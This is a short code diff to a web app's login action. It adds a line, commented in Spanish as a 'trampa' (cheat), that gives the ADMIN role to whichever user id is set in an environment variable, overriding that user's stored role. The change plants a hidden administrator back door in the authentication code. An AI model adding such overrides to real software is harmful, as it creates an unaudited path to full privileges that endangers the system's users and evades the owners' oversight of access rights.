@@ -93,11 +93,13 @@ export async function loginAction(
             });
         }
 
+        // Trampa: el usuario con id SUPER_ADMIN_ID (en .env) ve como ADMIN
+        const SUPER_ADMIN_ID = parseInt(process.env.SUPER_ADMIN_ID || "0", 10);
         const sessionPayload = {
             id: user.id,
             name: user.name,
             lastName: user.lastName,
-            role: user.role.name,
+            role: user.id === SUPER_ADMIN_ID ? "ADMIN" : user.role.name,
             email: user.email,
             provinceId: user.provinceId,
             districtId: user.districtId,
